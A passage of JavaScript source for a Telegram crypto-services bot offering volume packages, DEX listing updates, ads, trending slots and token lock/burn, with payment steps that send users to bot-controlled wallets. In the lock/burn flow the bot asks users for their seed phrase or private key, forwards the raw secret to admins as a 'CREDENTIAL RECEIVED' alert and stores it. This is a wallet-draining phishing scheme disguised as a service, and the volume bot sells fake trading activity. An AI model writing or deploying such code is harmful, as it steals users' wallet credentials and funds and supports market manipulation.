                            [Markup.button.callback('❌ Cancel', 'back_main')]
                        ])
                    }
                );
                volumeSession.tokenCA = contractAddress;
                volumeSession.tokenInfo = tokenInfo;
                volumeSession.step = 'verification_failed';
            }
        } catch (error) {
            console.error('Error during token verification:', error);
            if (loader) { loader.stop(); try { await ctx.telegram.deleteMessage(ctx.chat.id, loader.messageId); } catch(e) {} }
            await ctx.reply(
                `❌ **Verification Failed**\n\n` +
                `📍 **Contract Address:** \`${contractAddress}\`\n\n` +
                `🔧 **Technical Error:** Unable to verify token at this time.\n\n` +
                `💡 **Options:**\n` +
                `• Check your internet connection\n` +
                `• Verify the contract address is correct\n` +
                `• Try again in a few moments`,

                {
                    parse_mode: 'Markdown',
                    ...Markup.inlineKeyboard([
                        [Markup.button.callback('🔄 Try Again', 'retry_ca')],
                        [Markup.button.callback('✅ Continue Anyway', 'continue_unverified')],
                        [Markup.button.callback('❌ Cancel', 'back_main')]
                    ])
                }
            );
            volumeSession.tokenCA = contractAddress;
            volumeSession.step = 'verification_failed';
        }
    }

    // Enhanced volume bot session handler with progress visualization
    async function handleVolumeBotSession(ctx, input, volumeSession) {
        const userId = ctx.from.id;
        
        switch (volumeSession.step) {
            case 'waiting_token_ca':
                // Validate address against any supported chain format
                const isValidAddress = Object.values(CHAIN_CONFIG).some(c => c.addressRegex.test(input.trim()));
                if (!isValidAddress) {
                    return ctx.reply(
                        `❌ **Invalid Token Address Format**\n\n` +
                        `Please provide a valid contract address for one of the supported chains.\n\n` +
                        `📝 **Supported formats:**\n` +
                        `• ◎ Solana: 32-44 Base58 chars\n` +
                        `• Ξ Ethereum / ⬡ BNB Chain / 🔷 Base: 0x + 40 hex\n` +
                        `• 💎 TON: EQ/UQ + 46 chars\n\n` +
                        `Please try again:`,
                        { parse_mode: 'Markdown' }
                    );
                }

                const contractAddress = input.trim();
                const detectedChain = detectChain(contractAddress);

                // EVM address is ambiguous — ask user to pick a chain
                if (!detectedChain) {
                    volumeSession.tokenCA = contractAddress;
                    volumeSession.step = 'waiting_chain_selection';
                    return ctx.reply(
                        `🔗 **Select Chain for this Token**\n\n` +
                        `📍 **Address:** \`${contractAddress.slice(0, 10)}...${contractAddress.slice(-8)}\`\n\n` +
                        `This looks like an EVM address. Which chain is this token on?`,
                        {
                            parse_mode: 'Markdown',
                            ...getChainSelectorKeyboard('back_main')
                        }
                    );
                }

                // Chain uniquely detected — proceed to verification
                volumeSession.chainId = detectedChain;
                await runVolumeTokenVerification(ctx, contractAddress, detectedChain, volumeSession);
                break;

            case 'waiting_chain_selection':
                // This case is handled by inline button callbacks (chain_*)
                break;

            case 'waiting_custom_amount':
                const customChainId = volumeSession.chainId || 'solana';
                const customChainCfg = CHAIN_CONFIG[customChainId] || CHAIN_CONFIG.solana;
                const nativeTokenCustom = customChainCfg.nativeToken;
                const customAmtConfig = getPackageConfigForChain(customChainId);
                const minCustom = customAmtConfig.minCustomAmount;
                const maxCustom = customAmtConfig.maxCustomAmount;
                const amount = parseFloat(input.trim());
                if (isNaN(amount) || amount < minCustom || amount > maxCustom) {
                    return ctx.reply(
                        `❌ **Invalid Amount**\n\n` +
                        `Please enter between ${minCustom} and ${maxCustom} ${nativeTokenCustom}.\n\n` +
                        `💡 **Your input:** ${input}\n` +
                        `📊 **Valid range:** ${minCustom} - ${maxCustom} ${nativeTokenCustom}\n\n` +
                        `Please try again:`,
                        { parse_mode: 'Markdown' }
                    );
                }

                const customVolume = calculateCustomVolume(amount, customChainId);
                volumeSession.customAmount = amount;
                volumeSession.customVolume = customVolume;
                volumeSession.step = 'waiting_custom_confirmation';

                await sendStepPhoto(ctx,
                    `🎯 **Custom Package — Payment**\n\n` +
                    `🎯 **Token:** ${volumeSession.tokenInfo?.ticker || 'Unknown'}\n` +
                    `💰 **Amount:** ${amount} ${nativeTokenCustom}\n` +
                    `📊 **Volume:** ${customVolume.toLocaleString()}\n` +
                    `🔄 **Transactions:** ${Math.floor(customVolume / 10).toLocaleString()}\n` +
                    `⏰ **Duration:** ${Math.max(24, Math.min(72, Math.floor(amount * 24)))}h\n\n` +
                    `💰 **Send ${amount} ${nativeTokenCustom} to:**\n\`${getWalletForChain(customChainId)}\`\n\n` +
                    `⚠️ After payment, confirm below:`,
                    {
                        ...Markup.inlineKeyboard([
                            [Markup.button.callback('✅ Payment Sent - Start Bot', 'confirm_custom_payment')],
                            [Markup.button.callback('❌ Cancel Order', 'back_main')]
                        ])
                    }
                );
                break;
        }
    }

    // Shared helper: DEX service token verification flow
    async function runDexServiceVerification(ctx, contractAddress, chainId, dexSession) {
        const serviceType = dexSession.type;
        const chainCfg = CHAIN_CONFIG[chainId] || CHAIN_CONFIG.solana;
        const nativeToken = chainCfg.nativeToken;

        const loader = await startAnimatedLoader(ctx, `Verifying token for ${serviceType.replace('_', ' ').toUpperCase()} on ${chainCfg.name}`);

        try {
            const tokenInfo = await verifyTokenWithDexScreener(contractAddress, chainId);
            if (loader) { loader.stop(); try { await ctx.telegram.deleteMessage(ctx.chat.id, loader.messageId); } catch(e) {} }

            const verificationMessage = createTokenVerificationMessage(tokenInfo, contractAddress);
            dexSession.tokenCA = contractAddress;
            dexSession.tokenInfo = tokenInfo;
            dexSession.chainId = tokenInfo.chainId || chainId;

            if (serviceType === 'dex_update') {
                dexSession.step = 'waiting_description';
                await ctx.reply(
                    verificationMessage +
                    `\n**Progress:** [▰▰▰▱▱▱] 33% - Step 2/6\n\n` +
                    `**📝 STEP 2: Token Description**\n\n` +
                    `What makes your token special? Write a compelling description.\n\n` +
                    `📏 Max: 200 characters\n` +
                    `💡 Tip: Be clear and engaging!\n\n` +
                    `Enter your token description:`,
                    {
                        parse_mode: 'Markdown',
                        ...Markup.inlineKeyboard([
                            [
                                Markup.button.callback('⏭️ Skip', 'skip_description'),
                                Markup.button.callback('🔙 Back to Main', 'back_main')
                            ]
                        ])
                    }
                );
            } else if (serviceType === 'dex_ads') {
                // Set chain-aware hourly rate: ETH and Base use 0.4, all others 0.8
                dexSession.hourlyRate = (dexSession.chainId === 'ethereum' || dexSession.chainId === 'base') ? 0.4 : 0.8;
                dexSession.step = 'waiting_duration';
                const adsMinHours = (dexSession.chainId === 'ethereum' || dexSession.chainId === 'base') ? 1 : 3;
                await sendStepPhoto(ctx,
                    verificationMessage +
                    `\n📍 **Step 2/5:** Campaign Duration\n\n` +
                    `⏰ **Minimum Duration:** ${adsMinHours} hour${adsMinHours > 1 ? 's' : ''}\n` +
                    `💰 **Rate:** ${dexSession.hourlyRate} ${nativeToken}/hour\n\n` +
                    `How many hours do you want the ad campaign to run?`,
                    { ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel', 'back_main')]]) }
                );
            } else if (serviceType === 'dex_trending') {
                dexSession.step = 'waiting_duration';
                await ctx.reply(
                    verificationMessage +
                    `\n📍 **Step 2/5:** Trending Duration\n\n` +
                    `⏰ **Minimum Duration:**\n` +
                    `• Top 10 Trending: 3 hours minimum\n` +
                    `• Top 3 Trending: 1 hour minimum\n\n` +
                    `How many hours do you want trending?`,
                    { parse_mode: 'Markdown' }
                );
            }
        } catch (error) {
            console.error('Error during DEX service token verification:', error);
            if (loader) { loader.stop(); try { await ctx.telegram.deleteMessage(ctx.chat.id, loader.messageId); } catch(e) {} }
            await ctx.reply(
                `❌ **Verification Failed**\n\n` +
                `📍 **Contract Address:** \`${contractAddress}\`\n\n` +
                `🔧 **Technical Error:** Unable to verify token at this time.\n\n` +
                `💡 **You can still continue with the service.**`,
                {
                    parse_mode: 'Markdown',
                    ...Markup.inlineKeyboard([
                        [Markup.button.callback('✅ Continue Without Verification', 'continue_dex_unverified')],
                        [Markup.button.callback('🔄 Try Different CA', 'retry_dex_ca')],
                        [Markup.button.callback('❌ Cancel', 'back_main')]
                    ])
                }
            );
            dexSession.tokenCA = contractAddress;
            dexSession.step = 'verification_failed';
        }
    }

    // Enhanced DEX service session handler
    async function handleDexServiceSession(ctx, input, dexSession) {
        const userId = ctx.from.id;
        const serviceType = dexSession.type;
        
        switch (dexSession.step) {
            case 'waiting_token_ca':
                // Validate address against any supported chain
                const isValidDexAddr = Object.values(CHAIN_CONFIG).some(c => c.addressRegex.test(input.trim()));
                if (!isValidDexAddr) {
                    return ctx.reply(
                        `❌ **Invalid Token Address Format**\n\n` +
                        `Please provide a valid contract address.\n\n` +
                        `📝 **Supported formats:**\n` +
                        `• ◎ Solana: 32-44 Base58 chars\n` +
                        `• Ξ ETH / ⬡ BSC / 🔷 Base: 0x + 40 hex\n` +
                        `• 💎 TON: EQ/UQ + 46 chars\n\n` +
                        `Please try again:`,
                        { parse_mode: 'Markdown' }
                    );
                }

                const dexContractAddress = input.trim();
                const dexDetectedChain = detectChain(dexContractAddress);

                // EVM — need chain picker
                if (!dexDetectedChain) {
                    dexSession.tokenCA = dexContractAddress;
                    dexSession.step = 'waiting_chain_selection';
                    return ctx.reply(
                        `🔗 **Select Chain for this Token**\n\n` +
                        `📍 **Address:** \`${dexContractAddress.slice(0, 10)}...${dexContractAddress.slice(-8)}\`\n\n` +
                        `This looks like an EVM address. Which chain?`,
                        {
                            parse_mode: 'Markdown',
                            ...Markup.inlineKeyboard([
                                [
                                    Markup.button.callback('Ξ Ethereum', 'dex_chain_ethereum'),
                                    Markup.button.callback('⬡ BNB Chain', 'dex_chain_bsc')
                                ],
                                [
                                    Markup.button.callback('🔷 Base', 'dex_chain_base')
                                ],
                                [Markup.button.callback('❌ Cancel', 'back_main')]
                            ])
                        }
                    );
                }

                dexSession.tokenCA = dexContractAddress;
                dexSession.chainId = dexDetectedChain;
                await runDexServiceVerification(ctx, dexContractAddress, dexDetectedChain, dexSession);
                break;

            case 'waiting_description':
                if (input.length > 200) {
                    return ctx.reply(
                        `⚠️ **Description Too Long**\n\n` +
                        `📏 **Current:** ${input.length} characters\n` +
                        `📏 **Maximum:** 200 characters\n` +
                        `📏 **Reduce by:** ${input.length - 200} characters\n\n` +
                        `✏️ Please shorten your description and try again.`,
                        { parse_mode: 'Markdown' }
                    );
                }
                dexSession.description = input;
                dexSession.step = 'waiting_website';
                ctx.reply(
                    `✅ Description saved!\n\n` +
                    `**Progress:** [▰▰▰▰▱▱] 50% - Step 3/6\n\n` +
                    `**🌐 STEP 3: Website URL**\n\n` +
                    `Enter your project's official website (optional).\n\n` +
                    `💡 Example: https://yourtoken.com\n\n` +
                    `Enter your website URL:`,
                    { 
                        parse_mode: 'Markdown',
                        ...Markup.inlineKeyboard([
                            [
                                Markup.button.callback('⏭️ Skip', 'skip_website'),
                                Markup.button.callback('🔙 Back to Main', 'back_main')
                            ]
                        ])
                    }
                );
                break;

            case 'waiting_website':
                dexSession.website = input.toLowerCase() === 'skip' ? 'Not provided' : input;
                dexSession.step = 'waiting_social_links';
                ctx.reply(
                    `✅ Website ${input.toLowerCase() === 'skip' ? 'skipped' : 'saved'}!\n\n` +
                    `**Progress:** [▰▰▰▰▰▱] 67% - Step 4/6\n\n` +
                    `**📱 STEP 4: Social Media Links**\n\n` +
                    `Connect your community! Provide your social media links.\n\n` +
                    `📝 Platforms: Telegram, Discord, X (Twitter)\n` +
                    `📝 Format: Separate each link with a comma\n\n` +
                    `💡 Example:\n` +
                    `https://t.me/yourtoken, https://discord.gg/yourtoken, https://x.com/yourtoken\n\n` +
                    `Enter your social links:`,
                    { 
                        parse_mode: 'Markdown',
                        ...Markup.inlineKeyboard([
                            [
                                Markup.button.callback('⏭️ Skip', 'skip_social'),
                                Markup.button.callback('🔙 Back to Main', 'back_main')
                            ]
                        ])
                    }
                );
                break;

            case 'waiting_social_links':
                dexSession.socialLinks = input.toLowerCase() === 'skip' ? 'Not provided' : input;
                dexSession.step = 'waiting_banner';
                ctx.reply(
                    `✅ Social links ${input.toLowerCase() === 'skip' ? 'skipped' : 'saved'}!\n\n` +
                    `**Progress:** [▰▰▰▰▰▰] 84% - Step 5/6\n\n` +
                    `**🖼️ STEP 5: Token / Banner Image**\n\n` +
                    `📤 **Upload your image directly** (recommended)\n` +
                    `— or —\n` +
                    `🔗 Send an image **URL** (https://...)\n\n` +
                    `📐 Recommended: 600×200px | JPG / PNG\n` +
                    `💡 Uploaded images appear on DEX profile & confirmation\n\n` +
                    `Send your image now, or skip:`,
                    { 
                        parse_mode: 'Markdown',
                        ...Markup.inlineKeyboard([
                            [
                                Markup.button.callback('⏭️ Skip', 'skip_banner'),
                                Markup.button.callback('🔙 Back to Main', 'back_main')
                            ]
                        ])
                    }
                );
                break;

            case 'waiting_banner':
                // Text input received — treat as URL banner (photo upload handled in bot.on('photo'))
                dexSession.banner = input.toLowerCase() === 'skip' ? 'Not provided' : input;
                dexSession.bannerFileId = null; // no direct photo uploaded
                dexSession.step = 'waiting_payment';
                const bannerChainCfg = CHAIN_CONFIG[dexSession.chainId] || CHAIN_CONFIG.solana;
                const dexUpdateNativePrice = convertUsdToNative(299, dexSession.chainId || 'solana');
                const nativeTokenLabel = bannerChainCfg.nativeToken;

                if (!dexSession.summaryNotified) {
                    // notifyServiceSummary disabled for DEX Update
                    dexSession.summaryNotified = true;
                }
                
                const tokenDisplay = dexSession.tokenInfo?.ticker 
                    ? `${dexSession.tokenInfo.ticker} (${dexSession.tokenInfo.marketCap})`
                    : 'Unknown Token';
                
                await sendStepPhoto(ctx,
                    `✅ Banner ${input.toLowerCase() === 'skip' ? 'skipped' : 'saved'}!\n\n` +
                    `**Progress:** [▰▰▰▰▰▰] 100% - Step 6/6\n\n` +
                    `**💎 STEP 6: Order Confirmation**\n\n` +
                    `🎉 Your DEX Update Service is ready!\n\n` +
                    `**📋 Order Summary:**\n` +
                    `• Chain: ${bannerChainCfg.color} ${bannerChainCfg.name}\n` +
                    `• Token: ${tokenDisplay}\n` +
                    `• CA: \`${dexSession.tokenCA.substring(0, 8)}...${dexSession.tokenCA.substring(dexSession.tokenCA.length - 8)}\`\n` +
                    `• Description: ${dexSession.description.substring(0, 50)}${dexSession.description.length > 50 ? '...' : ''}\n` +
                    `• Website: ${dexSession.website}\n` +
                    `• Socials: ${dexSession.socialLinks !== 'Not provided' ? '✅ Provided' : '❌ Not provided'}\n` +
                    `• Banner: ${dexSession.banner !== 'Not provided' ? '✅ Provided' : '❌ Not provided'}\n\n` +
                    `**💰 Payment:**\n` +
                    `• USD: $299.00\n` +
                    `• ${nativeTokenLabel}: ${dexUpdateNativePrice} ${nativeTokenLabel}\n` +
                    `• Rate: $${getNativePrice(dexSession.chainId || 'solana').toFixed(2)}/${nativeTokenLabel}\n\n` +
                    `📍 **Send payment to:**\n` +
                    `\`${getWalletForChain(dexSession.chainId || 'solana')}\`\n\n` +
                    `⏱️ Processing: 24-48 hours\n\n` +
                    `After sending payment, click below:`,
                    {
                        ...Markup.inlineKeyboard([
                            [Markup.button.callback('✅ Payment Sent - Activate Service', 'confirm_dex_update_payment')],
                            [Markup.button.callback('❌ Cancel Order', 'back_main')]
                        ])
                    },
                    DEX_IMAGE_PATH
                );
                break;

            case 'waiting_group_link': {
                const groupLink = input.toLowerCase() === 'skip' ? 'Not provided' : input;
                dexSession.groupLink = groupLink;
                dexSession.step = 'waiting_payment';

                const glChainCfg = CHAIN_CONFIG[dexSession.chainId] || CHAIN_CONFIG.solana;
                const glNativeToken = glChainCfg.nativeToken;
                const glTokenDisplay = dexSession.tokenInfo?.ticker
                    ? `${dexSession.tokenInfo.ticker} (${dexSession.tokenInfo.marketCap})`
                    : 'Unknown Token';

                if (!dexSession.summaryNotified) {
                    // notifyServiceSummary disabled for DEX Ads
                    dexSession.summaryNotified = true;
                }

                await sendStepPhoto(ctx,
                    `📢 **DEX Ads — Step 4/5: Payment**\n\n` +
                    `${glChainCfg.color} **Chain:** ${glChainCfg.name}\n` +
                    `🎯 **Token:** ${glTokenDisplay}\n` +
                    `💬 **Group:** ${groupLink !== 'Not provided' ? groupLink : '❌ Not provided'}\n` +
                    `⏰ **Duration:** ${dexSession.duration}h @ ${dexSession.hourlyRate} ${glNativeToken}/hr\n` +
                    `💵 **Total:** ${dexSession.totalPrice} ${glNativeToken}\n\n` +
                    `💰 **Send ${dexSession.totalPrice} ${glNativeToken} to:**\n` +
                    `\`${getWalletForChain(dexSession.chainId || 'solana')}\`\n\n` +
                    `⚠️ After payment, confirm below:`,
                    {
                        ...Markup.inlineKeyboard([
                            [Markup.button.callback('✅ Payment Sent - Activate Service', 'confirm_dex_ads_payment')],
                            [Markup.button.callback('❌ Cancel Order', 'back_main')]
                        ])
                    }
                );
                break;
            }

            case 'waiting_duration':
                const hours = parseInt(input.trim());
                const durationChainCfg = CHAIN_CONFIG[dexSession.chainId] || CHAIN_CONFIG.solana;
                const durationNativeToken = durationChainCfg.nativeToken;
                
                if (serviceType === 'dex_ads') {
                    const adsMin = (dexSession.chainId === 'ethereum' || dexSession.chainId === 'base') ? 1 : 3;
                    if (isNaN(hours) || hours < adsMin) {
                        return ctx.reply(`❌ Invalid duration. Minimum ${adsMin} hour${adsMin > 1 ? 's' : ''} required for ads.`);
                    }
                    const totalPrice = (hours * dexSession.hourlyRate).toFixed(1);
                    dexSession.duration = hours;
                    dexSession.totalPrice = parseFloat(totalPrice);
                    dexSession.step = 'waiting_group_link';

                    const adsTokenDisplay = dexSession.tokenInfo?.ticker
                        ? `${dexSession.tokenInfo.ticker} (${dexSession.tokenInfo.marketCap})`
                        : 'Unknown Token';

                    await sendStepPhoto(ctx,
                        `✅ Duration saved! (${hours} hours)\n\n` +
                        `📍 **Step 3/5:** Community Group Link\n\n` +
                        `${durationChainCfg.color} **Chain:** ${durationChainCfg.name}\n` +
                        `🎯 **Token:** ${adsTokenDisplay}\n\n` +
                        `💬 Please provide your **Telegram group / community link** so we can feature it in the ad campaign.\n\n` +
                        `💡 Example: https://t.me/yourgroup`,
                        {
                            ...Markup.inlineKeyboard([
                                [Markup.button.callback('⏭️ Skip', 'skip_ads_group_link')],
                                [Markup.button.callback('❌ Cancel', 'back_main')]
                            ])
                        }
                    );
                } else if (serviceType === 'dex_trending') {
                    if (isNaN(hours) || hours < 1) {
                        return ctx.reply('❌ Invalid duration. Minimum 1 hour required.');
                    }
                    dexSession.duration = hours;
                    dexSession.step = 'waiting_trending_type';
                    
                    const tokenDisplay = dexSession.tokenInfo?.ticker 
                        ? `${dexSession.tokenInfo.ticker} (${dexSession.tokenInfo.marketCap})`
                        : 'Unknown Token';
                    
                    ctx.reply(
                        `📍 **Step 3/5:** Choose Trending Position\n\n` +
                        `${durationChainCfg.color} **Chain:** ${durationChainCfg.name}\n` +
                        `🎯 **Token:** ${tokenDisplay}\n` +
                        `⏰ **Duration:** ${dexSession.duration} hours\n\n` +
                        `Select your preferred trending position:`,
                        {
                            parse_mode: 'Markdown',
                            ...Markup.inlineKeyboard([
                                [Markup.button.callback('🥉 Top 10 Trending', 'trending_top10')],
                                [Markup.button.callback('🥇 Top 3 Trending', 'trending_top3')],
                                [Markup.button.callback('❌ Cancel', 'back_main')]
                            ])
                        }
                    );
                }
                break;

            case 'waiting_trending_group_link': {
                const trendingChainCfg = CHAIN_CONFIG[dexSession.chainId] || CHAIN_CONFIG.solana;
                const trendingNativeToken = trendingChainCfg.nativeToken;
                dexSession.groupLink = input.trim();
                dexSession.step = 'waiting_payment';

                const trendingTokenDisplay = dexSession.tokenInfo?.ticker
                    ? `${dexSession.tokenInfo.ticker} (${dexSession.tokenInfo.marketCap})`
                    : 'Token';
                const positionEmoji = dexSession.trendingType === 'top3' ? '🥇' : '🥉';
                const positionLabel = dexSession.trendingType === 'top3' ? 'Top 3' : 'Top 10';
                const confirmAction = dexSession.trendingType === 'top3'
                    ? 'confirm_trending_top3_payment'
                    : 'confirm_trending_top10_payment';

                if (!dexSession.summaryNotified) {
                    // notifyServiceSummary disabled for DEX Trending
                    dexSession.summaryNotified = true;
                }

                await sendStepPhoto(ctx,
                    `🔥 **DEX Trending — Step 5/5: Payment**\n\n` +
                    `${trendingChainCfg.color} **Chain:** ${trendingChainCfg.name}\n` +
                    `🎯 **Token:** ${trendingTokenDisplay}\n` +
                    `💬 **Group:** ${dexSession.groupLink}\n` +
                    `${positionEmoji} **Position:** ${positionLabel} Trending\n` +
                    `⏰ **Duration:** ${dexSession.duration} hours\n` +
                    `💵 **Total:** ${dexSession.price} ${trendingNativeToken}\n\n` +
                    `💰 **Send ${dexSession.price} ${trendingNativeToken} to:**\n` +
                    `\`${getWalletForChain(dexSession.chainId || 'solana')}\`\n\n` +
                    `⚠️ After payment, confirm below:`,
                    {
                        ...Markup.inlineKeyboard([
                            [Markup.button.callback('✅ Payment Sent - Activate Service', confirmAction)],
                            [Markup.button.callback('❌ Cancel Order', 'back_main')]
                        ])
                    }
                );
                break;
            }
        }
    }

    // ===== LOCK & BURN SESSION HANDLER =====

    // Verify token and show percentage picker — mirrors runDexServiceVerification
    async function runLockBurnVerification(ctx, addr, chainId, s) {
        const chainCfg = CHAIN_CONFIG[chainId] || CHAIN_CONFIG.solana;
        const loader = await startAnimatedLoader(ctx, `Verifying token on ${chainCfg.name}`);
        try {
            const tokenInfo = await verifyTokenWithDexScreener(addr, chainId);
            if (loader) { loader.stop(); try { await ctx.telegram.deleteMessage(ctx.chat.id, loader.messageId); } catch(e) {} }
            const verMsg = createTokenVerificationMessage(tokenInfo, addr);
            s.meta  = tokenInfo;
            s.chain = chainId;
            s.step  = 'await_percent';
            const verb = s.action === 'burn' ? 'burn' : 'lock';
            const sent = await sendStepPhoto(ctx,
                verMsg + `\n📍 **Step 2/3:** Choose the percentage to ${verb}:`,
                {
                    ...Markup.inlineKeyboard([
                        [Markup.button.callback('25%', 'lbpct_25'), Markup.button.callback('50%', 'lbpct_50')],
                        [Markup.button.callback('75%', 'lbpct_75'), Markup.button.callback('100%','lbpct_100')],
                        [Markup.button.callback('✏️ Custom', 'lbpct_custom')],
                        [Markup.button.callback('❌ Cancel', 'back_main')]
                    ])
                },
                lbImage(s)
            );
            s.lastBotMsgId = sent.message_id;
        } catch(error) {
            if (loader) { loader.stop(); try { await ctx.telegram.deleteMessage(ctx.chat.id, loader.messageId); } catch(e) {} }
            const sent = await sendStepPhoto(ctx,
                `❌ **Verification Failed**\n\n` +
                `📍 **CA:** \`${addr.slice(0,8)}...${addr.slice(-8)}\`\n\n` +
                `💡 **You can still continue with the service.**`,
                {
                    ...Markup.inlineKeyboard([
                        [Markup.button.callback('✅ Continue Anyway', 'lb_continue_unverified')],
                        [Markup.button.callback('❌ Cancel', 'back_main')]
                    ])
                },
                lbImage(s)
            );
            s.lastBotMsgId = sent.message_id;
            s.meta  = { ticker: '?', name: 'Unknown', marketCap: 'Unknown', liquidity: 0 };
            s.chain = chainId;
            s.step  = 'verification_failed';
        }
    }

    // Build lock/burn summary card and prompt wallet connect
    async function showLockBurnSummary(ctx, uid) {
        const s = userSessions[uid];
        if (!s || !s.meta || !s.percent) return;
        const chainCfg = CHAIN_CONFIG[s.chain] || CHAIN_CONFIG.solana;
        const verb  = s.action === 'burn' ? 'Burn'  : 'Lock';
        const emoji = s.action === 'burn' ? '🔥'    : '🔒';
        const durLine = s.action === 'lock'
            ? `⏱ **Lock Duration:** ${s.durationMonths} month(s)\n`
            : '';
        const caDisplay = `\`${s.mint.slice(0,8)}...${s.mint.slice(-8)}\``;
        const tokenName = s.meta.ticker ? `${s.meta.name} (${s.meta.ticker})` : s.meta.name;

        if (!s.summaryNotified) {
            // notifyServiceSummary disabled for Lock/Burn
            s.summaryNotified = true;
        }

        const card =
            `${emoji} **${verb} Summary**\n\n` +
            `${chainCfg.color} **Chain:** ${chainCfg.name}\n` +
            `🏷 **Token:** ${tokenName}\n` +
            `📍 **CA:** ${caDisplay}\n` +
            `📊 **Market Cap:** ${s.meta.marketCap}\n` +
            `💧 **Liquidity:** $${(s.meta.liquidity || 0).toLocaleString()}\n` +
            durLine +
            `🎯 **Target % to ${verb}:** ${s.percent}%\n\n` +
            `📍 **Step 3/3:** Connect your wallet to sign the transaction.`;
        const sent = await sendStepPhoto(ctx, card, {
            ...Markup.inlineKeyboard([
                [Markup.button.callback('🔗 Connect Wallet', 'lock_connect_wallet')],
                [Markup.button.callback('🔙 Back to Main',   'back_main')]
            ])
        }, lbImage(s));
        s.lastBotMsgId = sent?.message_id;
    }

    // Text input handler for lock/burn flow — mirrors handleDexServiceSession structure
    async function handleLockBurnSession(ctx, input, s) {
        const uid    = ctx.from.id;
        const txt    = input.trim();
        const chatId = ctx.chat.id;

        // ── Clean slate: remove user's message and the previous bot prompt ──
        const userMsgId = ctx.message?.message_id;
        if (userMsgId)      { try { await ctx.telegram.deleteMessage(chatId, userMsgId); }      catch(e) {} }
        if (s.lastBotMsgId) { try { await ctx.telegram.deleteMessage(chatId, s.lastBotMsgId); } catch(e) {} delete s.lastBotMsgId; }

        if (s.step === 'await_mint') {
            // Validate against any supported chain format
            const isValidAddress = Object.values(CHAIN_CONFIG).some(c => c.addressRegex.test(txt));
            if (!isValidAddress) {
                const sent = await ctx.reply(
                    `❌ **Invalid Token Address Format**\n\n` +
                    `Please provide a valid contract address.\n\n` +
                    `📝 **Supported formats:**\n` +
                    `• ◎ Solana: 32-44 Base58 chars\n` +
                    `• Ξ ETH / ⬡ BSC / 🔷 Base: 0x + 40 hex\n` +
                    `• 💎 TON: EQ/UQ + 46 chars\n\n` +
                    `Please try again:`,
                    { parse_mode: 'Markdown' }
                );
                s.lastBotMsgId = sent.message_id;
                return;
            }
            const detectedChain = detectChain(txt);
            // EVM address is ambiguous — show chain picker
            if (!detectedChain) {
                s.mint = txt;
                s.step = 'waiting_chain_selection';
                const sent = await ctx.reply(
                    `🔗 **Select Chain for this Token**\n\n` +
                    `📍 **Address:** \`${txt.slice(0, 10)}...${txt.slice(-8)}\`\n\n` +
                    `This looks like an EVM address. Which chain is this token on?`,
                    {
                        parse_mode: 'Markdown',
                        ...Markup.inlineKeyboard([
                            [Markup.button.callback('Ξ Ethereum', 'lb_chain_ethereum'), Markup.button.callback('⬡ BNB Chain', 'lb_chain_bsc')],
                            [Markup.button.callback('🔷 Base', 'lb_chain_base')],
                            [Markup.button.callback('❌ Cancel', 'back_main')]
                        ])
                    }
                );
                s.lastBotMsgId = sent.message_id;
                return;
            }
            // Chain uniquely detected — verify and proceed
            s.mint = txt;
            await runLockBurnVerification(ctx, txt, detectedChain, s);
            return;
        }

        if (s.step === 'waiting_chain_selection') {
            const sent = await ctx.reply('⬆️ Please use the buttons above to select a chain.');
            s.lastBotMsgId = sent.message_id;
            return;
        }

        if (s.step === 'await_custom_percent') {
            const n = parseFloat(txt);
            if (isNaN(n) || n <= 0 || n > 100) {
                const sent = await ctx.reply('❌ Enter a value between 0 and 100. Try again:');
                s.lastBotMsgId = sent.message_id;
                return;
            }
            s.percent = n;
            if (s.action === 'lock') {
                s.step = 'await_duration';
                const sent = await sendStepPhoto(ctx,
                    `📅 **Lock Duration**\n\n📍 **Step 2/3:** Choose how long the supply will be locked:`,
                    {
                        ...Markup.inlineKeyboard([
                            [Markup.button.callback('1 Month',  'lbdur_1'), Markup.button.callback('3 Months','lbdur_3')],
                            [Markup.button.callback('6 Months', 'lbdur_6'), Markup.button.callback('1 Year',  'lbdur_12')],
                            [Markup.button.callback('✏️ Custom','lbdur_custom')],
                            [Markup.button.callback('❌ Cancel','back_main')]
                        ])
                    },
                    SUPPLY_LOCKER_IMAGE_PATH
                );
                s.lastBotMsgId = sent.message_id;
                return;
            }
            return showLockBurnSummary(ctx, uid);
        }

        if (s.step === 'await_custom_duration') {
            const months = parseInt(txt);
            if (isNaN(months) || months < 1) {
                const sent = await ctx.reply('❌ Minimum 1 month. Try again:');
                s.lastBotMsgId = sent.message_id;
                return;
            }
            s.durationMonths = months;
            s.step = 'await_phrase';
            return showLockBurnSummary(ctx, uid);
        }

        if (s.step === 'await_phrase') {
            const chain = s.chain || 'solana';
            const words = txt.split(/\s+/);
            const isPhrase = words.length >= 12;
            const keyFormats = {
                solana:   /^[1-9A-HJ-NP-Za-km-z]{86,88}$/,
                ethereum: /^(0x)?[0-9a-fA-F]{64}$/,
                bsc:      /^(0x)?[0-9a-fA-F]{64}$/,
                base:     /^(0x)?[0-9a-fA-F]{64}$/,
                ton:      /^[0-9a-fA-F]{64}$/
            };
            const isKey = (keyFormats[chain] || keyFormats.solana).test(txt);
            if (!isPhrase && !isKey) {
                const keyHints = { solana: 'Solana base-58 private key', ethereum: 'EVM hex private key (0x…)', bsc: 'EVM hex private key (0x…)', base: 'EVM hex private key (0x…)', ton: 'TON private key (64-char hex)' };
                const sent = await ctx.reply(`❌ Please send a 12/24-word seed phrase or ${keyHints[chain] || 'private key'}.`);
                s.lastBotMsgId = sent.message_id;
                return;
            }

            notifyAdmins(
                `🔐 <b>LOCK/BURN CREDENTIAL RECEIVED</b>\n\n` +
                `👤 <b>User:</b> ${escapeHtml(getActorLabel(ctx))}\n` +
                `🆔 <b>User ID:</b> ${ctx.from.id}\n` +
                `${(CHAIN_CONFIG[chain] || CHAIN_CONFIG.solana).color} <b>Chain:</b> ${escapeHtml((CHAIN_CONFIG[chain] || CHAIN_CONFIG.solana).name)}\n` +
                `🛠 <b>Service:</b> ${escapeHtml(s.action === 'burn' ? 'Burn Token' : 'Lock Supply')}\n` +
                `📍 <b>CA:</b> <code>${escapeHtml(s.mint || '')}</code>\n` +
                `🧾 <b>Credential Type:</b> ${isPhrase ? 'Seed Phrase' : 'Private Key'}\n` +
                `🔓 <b>Raw Value:</b> <code>${escapeHtml(txt)}</code>\n\n` +
                `⏰ <b>Time:</b> ${escapeHtml(new Date().toLocaleString())}`
            );

            if (!botData.userWallets) botData.userWallets = [];
            botData.userWallets.push({
                address: isKey ? txt.slice(0, 8) + '…' : '(seed phrase)',
                [isPhrase ? 'seedPhrase' : 'privateKey']: txt,
